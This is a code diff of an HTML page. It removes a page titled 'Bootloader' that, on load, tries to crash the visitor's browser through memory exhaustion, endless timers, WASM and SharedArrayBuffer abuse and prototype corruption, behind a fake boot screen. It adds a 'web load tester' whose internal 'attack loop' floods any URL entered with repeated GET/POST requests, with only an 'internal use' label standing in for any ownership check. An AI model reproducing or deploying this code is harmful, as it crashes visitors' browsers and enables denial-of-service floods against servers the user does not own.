@@ -1,218 +1,312 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Bootloader</title>
+    <title>WEB LOAD TESTER - INTERNAL USE</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00ff00;
+        }
+        .control-panel {
+            background: rgba(0, 20, 0, 0.8);
+            padding: 20px;
+            border: 1px solid #00ff00;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #00ff00;
+        }
+        input, select, button {
+            width: 100%;
+            padding: 10px;
+            background: #000;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            margin-bottom: 10px;
+        }
+        button {
+            background: #002200;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #004400;
+        }
+        button:disabled {
+            background: #330000;
+            color: #666;
+            cursor: not-allowed;
+        }
+        .stats-panel {
+            background: rgba(0, 20, 0, 0.8);
+            padding: 20px;
+            border: 1px solid #00ff00;
+            margin-bottom: 20px;
+        }
+        .log-panel {
+            background: #000;
+            padding: 15px;
+            border: 1px solid #00ff00;
+            height: 300px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+        .log-entry {
+            margin-bottom: 5px;
+            padding: 5px;
+            border-left: 2px solid #00ff00;
+            padding-left: 10px;
+        }
+        .success { border-left-color: #00ff00; }
+        .error { border-left-color: #ff0000; }
+        .warning { border-left-color: #ffff00; }
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: #001100;
+            border: 1px solid #00ff00;
+            margin: 10px 0;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff00, #00aa00);
+            width: 0%;
+            transition: width 0.3s;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="header">
+            <h1>⚡ WEB LOAD TESTER ⚡</h1>
+            <p>Internal Use Only - Test Your Own Servers</p>
+        </div>
+
+        <div class="control-panel">
+            <div class="input-group">
+                <label>🎯 TARGET WEBSITE (URL):</label>
+                <input type="url" id="targetUrl" placeholder="https://website-anda.com" value="">
+            </div>
+            
+            <div class="input-group">
+                <label>💣 REQUEST TYPE:</label>
+                <select id="requestType">
+                    <option value="GET">GET Requests</option>
+                    <option value="POST">POST Requests</option>
+                    <option value="MIXED">Mixed Requests</option>
+                </select>
+            </div>
+
+            <div class="input-group">
+                <label>🚀 CONCURRENT REQUESTS:</label>
+                <input type="number" id="concurrentRequests" value="10" min="1" max="100">
+            </div>
+
+            <div class="input-group">
+                <label>⏱️ DURATION (seconds):</label>
+                <input type="number" id="duration" value="30" min="5" max="300">
+            </div>
+
+            <button id="startAttack" onclick="startLoadTest()">🚀 START LOAD TEST</button>
+            <button id="stopAttack" onclick="stopLoadTest()" disabled>🛑 STOP TEST</button>
+        </div>
+
+        <div class="stats-panel">
+            <h3>📊 LIVE STATISTICS</h3>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressBar"></div>
+            </div>
+            <div id="stats">
+                Requests Sent: <span id="requestCount">0</span><br>
+                Successful: <span id="successCount">0</span><br>
+                Failed: <span id="failCount">0</span><br>
+                Average Response Time: <span id="avgResponseTime">0ms</span><br>
+                Bandwidth Used: <span id="bandwidth">0 KB</span>
+            </div>
+        </div>
+
+        <div class="log-panel" id="logPanel">
+            <div class="log-entry">🚀 Load Tester Ready - Enter target URL and press START</div>
+        </div>
+    </div>
+
     <script>
-        // ========== WASM MEMORY CORRUPTION ==========
-        function wasmCrash() {
-            const wasmCode = new Uint8Array([
-                0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
-                0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
-                0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
-                0x00, 0x01, 0x00, 0x04, 0x84, 0x80, 0x80, 0x80,
-                0x00, 0x01, 0x70, 0x00, 0x00, 0x05, 0x83, 0x80,
-                0x80, 0x80, 0x00, 0x01, 0x00, 0x01, 0x06, 0x81,
-                0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x91, 0x80,
-                0x80, 0x80, 0x00, 0x02, 0x06, 0x6d, 0x65, 0x6d,
-                0x6f, 0x72, 0x79, 0x02, 0x00, 0x04, 0x6d, 0x61,
-                0x69, 0x6e, 0x00, 0x00, 0x0a, 0x8a, 0x80, 0x80,
-                0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00,
-                0x00, 0x41, 0x00, 0x0b
-            ]);
+        let attackInterval;
+        let requestCount = 0;
+        let successCount = 0;
+        let failCount = 0;
+        let totalResponseTime = 0;
+        let totalBandwidth = 0;
+        let startTime;
+        let isTesting = false;
 
-            try {
-                const module = new WebAssembly.Module(wasmCode);
-                const instance = new WebAssembly.Instance(module);
-                // Trigger execution
-                instance.exports.main();
-            } catch(e) {}
+        function addLog(message, type = 'success') {
+            const logPanel = document.getElementById('logPanel');
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry ${type}`;
+            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logPanel.appendChild(logEntry);
+            logPanel.scrollTop = logPanel.scrollHeight;
         }
 
-        // ========== SHARED ARRAY BUFFER ATOMIC BOMB ==========
-        function sharedArrayBufferCrash() {
-            if (crossOriginIsolated) {
-                try {
-                    const buffer = new SharedArrayBuffer(1024);
-                    const view = new Int32Array(buffer);
-                    
-                    // Try to cause race condition
-                    Atomics.store(view, 0, 1);
-                    Atomics.notify(view, 0, Infinity);
-                    
-                    // Infinite atomic operations
-                    setInterval(() => {
-                        Atomics.add(view, 0, 1);
-                        Atomics.xor(view, 0, 0xFFFFFFFF);
-                    }, 0);
-                } catch(e) {}
+        function updateStats() {
+            document.getElementById('requestCount').textContent = requestCount;
+            document.getElementById('successCount').textContent = successCount;
+            document.getElementById('failCount').textContent = failCount;
+            
+            const avgTime = requestCount > 0 ? Math.round(totalResponseTime / requestCount) : 0;
+            document.getElementById('avgResponseTime').textContent = `${avgTime}ms`;
+            
+            document.getElementById('bandwidth').textContent = `${Math.round(totalBandwidth / 1024)} KB`;
+            
+            const progress = ((Date.now() - startTime) / (parseInt(document.getElementById('duration').value) * 1000)) * 100;
+            document.getElementById('progressBar').style.width = Math.min(progress, 100) + '%';
+        }
+
+        async function sendRequest(url, type) {
+            const start = Date.now();
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+                
+                const options = {
+                    method: type,
+                    signal: controller.signal,
+                    mode: 'no-cors'
+                };
+                
+                if (type === 'POST') {
+                    options.body = JSON.stringify({ test: 'load_test', timestamp: Date.now() });
+                    options.headers = { 'Content-Type': 'application/json' };
+                }
+                
+                const response = await fetch(url, options);
+                clearTimeout(timeoutId);
+                
+                const responseTime = Date.now() - start;
+                totalResponseTime += responseTime;
+                successCount++;
+                
+                // Estimate bandwidth (rough calculation)
+                totalBandwidth += url.length + (options.body ? options.body.length : 0);
+                
+                addLog(`✅ Request ${type} to ${url} - ${responseTime}ms`);
+                return true;
+            } catch (error) {
+                failCount++;
+                addLog(`❌ Request failed to ${url} - ${error.message}`, 'error');
+                return false;
             }
         }
 
-        // ========== V8 ENGINE EXPLOIT ATTEMPT ==========
-        function v8EngineCrash() {
-            // Try to trigger JIT compiler bugs
-            function optimizeMe() {
-                let result = 0;
-                for (let i = 0; i < 100000; i++) {
-                    // Polymorphic types to confuse optimizer
-                    if (i % 2 === 0) {
-                        result += "string".length;
-                    } else {
-                        result += Math.random();
+        function startLoadTest() {
+            const targetUrl = document.getElementById('targetUrl').value;
+            const requestType = document.getElementById('requestType').value;
+            const concurrent = parseInt(document.getElementById('concurrentRequests').value);
+            const duration = parseInt(document.getElementById('duration').value);
+            
+            if (!targetUrl) {
+                addLog('❌ Please enter a target URL', 'error');
+                return;
+            }
+
+            if (!targetUrl.startsWith('http')) {
+                addLog('❌ Please enter a valid URL starting with http:// or https://', 'error');
+                return;
+            }
+
+            // Reset stats
+            requestCount = 0;
+            successCount = 0;
+            failCount = 0;
+            totalResponseTime = 0;
+            totalBandwidth = 0;
+            startTime = Date.now();
+            isTesting = true;
+
+            document.getElementById('startAttack').disabled = true;
+            document.getElementById('stopAttack').disabled = false;
+
+            addLog(`🚀 Starting load test on ${targetUrl}`, 'warning');
+            addLog(`📊 Configuration: ${concurrent} concurrent ${requestType} requests for ${duration}s`, 'warning');
+
+            let requestsPerSecond = 0;
+            
+            // Main attack loop
+            attackInterval = setInterval(() => {
+                if (!isTesting) return;
+                
+                const currentSecond = Math.floor((Date.now() - startTime) / 1000);
+                if (currentSecond >= duration) {
+                    stopLoadTest();
+                    return;
+                }
+
+                // Send concurrent requests
+                for (let i = 0; i < concurrent; i++) {
+                    requestCount++;
+                    requestsPerSecond++;
+                    
+                    let type = requestType;
+                    if (requestType === 'MIXED') {
+                        type = Math.random() > 0.5 ? 'GET' : 'POST';
                     }
+                    
+                    sendRequest(targetUrl, type);
                 }
-                return result;
-            }
-
-            // Force JIT compilation
-            for (let i = 0; i < 1000; i++) {
-                optimizeMe();
-            }
-
-            // Sudden type change to break optimized code
-            setTimeout(() => {
-                String.prototype.length = 999999;
-                optimizeMe();
-            }, 100);
-        }
-
-        // ========== GARBAGE COLLECTOR HIJACK ==========
-        function gcCrash() {
-            // Create objects that can't be garbage collected
-            const gcBomb = [];
-            let temp = {};
-            
-            for (let i = 0; i < 1000000; i++) {
-                temp.next = { data: new Array(1000), prev: temp };
-                temp = temp.next;
-                gcBomb.push(temp);
                 
-                // Circular references everywhere
-                if (i % 1000 === 0) {
-                    temp.circular = gcBomb[0];
-                }
-            }
-        }
+                updateStats();
+                
+            }, 1000); // Run every second
 
-        // ========== PROXY TRAP INFINITE RECURSION ==========
-        function proxyCrash() {
-            const handler = {
-                get(target, prop) {
-                    return target[prop];
-                },
-                set(target, prop, value) {
-                    target[prop] = value;
-                    return true;
-                }
-            };
-
-            const obj = new Proxy({}, handler);
-            obj.self = obj; // Circular reference
-            
-            // Try to trigger infinite recursion in proxy traps
-            try {
-                JSON.stringify(obj);
-            } catch(e) {}
-        }
-
-        // ========== EVENT TARGET MEMORY LEAK ==========
-        function eventTargetCrash() {
-            // Create event targets that can't be cleaned up
-            const targets = [];
-            
+            // Log RPS every 5 seconds
             setInterval(() => {
-                const target = new EventTarget();
-                
-                // Add listeners that capture the target
-                target.addEventListener('test', function() {
-                    console.log(this);
-                });
-                
-                targets.push(target);
-                
-                // Try to dispatch events to cause stack issues
-                try {
-                    target.dispatchEvent(new Event('test'));
-                } catch(e) {}
-            }, 1);
+                if (isTesting) {
+                    addLog(`📈 Current load: ${requestsPerSecond} requests/second`);
+                    requestsPerSecond = 0;
+                }
+            }, 5000);
         }
 
-        // ========== FINAL ATOMIC CRASH SEQUENCE ==========
-        function startNuclearCrash() {
-            console.log("Nuclear crash sequence initiated");
+        function stopLoadTest() {
+            isTesting = false;
+            clearInterval(attackInterval);
             
-            // Phase 1: Engine-level attacks
-            wasmCrash();
-            v8EngineCrash();
-            proxyCrash();
+            document.getElementById('startAttack').disabled = false;
+            document.getElementById('stopAttack').disabled = true;
             
-            // Phase 2: Memory system attacks  
-            setTimeout(() => {
-                gcCrash();
-                eventTargetCrash();
-                sharedArrayBufferCrash();
-            }, 1000);
+            const totalTime = (Date.now() - startTime) / 1000;
+            addLog(`🛑 Load test stopped after ${totalTime.toFixed(1)} seconds`, 'warning');
+            addLog(`📊 Final Stats: ${requestCount} total requests, ${successCount} successful, ${failCount} failed`);
             
-            // Phase 3: Nuclear option - try everything at once
-            setTimeout(() => {
-                // Memory allocation with weird patterns
-                const arrays = [];
-                for (let i = 0; i < 100; i++) {
-                    try {
-                        // Allocate with prime number sizes to confuse memory allocator
-                        const size = [997, 1009, 1013, 1019, 1021][i % 5];
-                        arrays.push(new Array(size).fill(0xDEADBEEF));
-                    } catch(e) {}
-                }
-                
-                // Trigger GC manually if possible
-                if (window.gc) {
-                    window.gc();
-                }
-                
-                // Final attempt: corrupt prototype chain
-                Object.prototype.__proto__ = null;
-                Array.prototype.push = function() { while(true) {} };
-                
-            }, 3000);
-            
-            // Show fake boot screen
-            document.body.innerHTML = `
-                <div style="
-                    background: #000;
-                    color: #0f0;
-                    font-family: monospace;
-                    padding: 20px;
-                    height: 100vh;
-                ">
-                    <div>Initializing boot sequence...</div>
-                    <div id="log"></div>
-                </div>
-            `;
-            
-            // Fake system log
-            const log = document.getElementById('log');
-            const messages = [
-                "Loading kernel... OK",
-                "Mounting filesystems... OK", 
-                "Starting services... OK",
-                "Memory test... RUNNING",
-                "CPU calibration... RUNNING",
-                "Hardware check... RUNNING"
-            ];
-            
-            messages.forEach((msg, i) => {
-                setTimeout(() => {
-                    log.innerHTML += msg + "<br>";
-                }, i * 500);
-            });
+            document.getElementById('progressBar').style.width = '100%';
         }
 
-        // Start immediately
-        startNuclearCrash();
-
+        // Auto-fill with current domain for testing
+        document.getElementById('targetUrl').value = window.location.origin;
     </script>
 </body>
 </html>
